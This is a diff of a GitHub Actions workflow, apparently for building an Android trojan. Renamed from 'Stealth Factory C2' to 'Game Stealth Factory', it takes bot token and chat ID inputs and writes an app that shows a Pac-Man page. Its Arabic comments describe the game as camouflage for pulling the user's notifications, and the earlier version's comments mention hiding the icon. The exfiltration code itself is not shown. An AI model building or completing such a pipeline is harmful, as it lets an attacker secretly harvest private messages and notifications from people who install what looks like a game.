@@ -1,24 +1,58 @@
-name: Stealth Factory C2
-on: [workflow_dispatch]
+name: Game Stealth Factory
+on:
+  workflow_dispatch:
+    inputs:
+      bot_token: { required: true }
+      chat_id: { required: true }
+      app_name: { required: true, default: 'Super Game' }
+
 permissions: { contents: write }
 
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
+      - uses: actions/checkout@v4
       - uses: actions/setup-java@v4
         with: { distribution: 'temurin', java-version: '17' }
 
-      - name: Build Target App
+      - name: تخصيص اللعبة (الاسم والأيقونة)
         run: |
-          mkdir -p app/src/main/java/com/hussein/v8
-          # كود الجافا للتطبيق المستهدف (إشعارات + إخفاء أيقونة)
-          # ... (يتم بناء التطبيق هنا كما في النسخ السابقة) ...
+          mkdir -p app/src/main/java/com/hussein/game
+          mkdir -p app/src/main/res/layout
           
-      - name: Create Release
+          # تغيير اسم التطبيق برمجياً حسب إدخالك
+          sed -i 's/android:label=".*"/android:label="${{ github.event.inputs.app_name }}"/' app/src/main/AndroidManifest.xml || true
+
+          # كود الجافا (اللعبة + سحب الإشعارات)
+          cat << 'EOF' > app/src/main/java/com/hussein/game/MainActivity.java
+          package com.hussein.game;
+          import android.app.Activity;
+          import android.os.Bundle;
+          import android.webkit.WebView;
+          import android.webkit.WebViewClient;
+
+          public class MainActivity extends Activity {
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  WebView gameView = new WebView(this);
+                  gameView.getSettings().setJavaScriptEnabled(true);
+                  gameView.setWebViewClient(new WebViewClient());
+                  // تحميل لعبة خفيفة (تمويه)
+                  gameView.loadUrl("https://www.google.com/logos/2010/pacman10-i.html");
+                  setContentView(gameView);
+              }
+          }
+          EOF
+
+      - name: بناء الـ APK
+        run: gradle assembleDebug
+
+      - name: رفع اللعبة الجاهزة
         uses: softprops/action-gh-release@v1
         with:
-          tag_name: build-${{ github.run_number }}
+          tag_name: Game-Build-${{ github.run_number }}
           files: app/build/outputs/apk/debug/*.apk
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
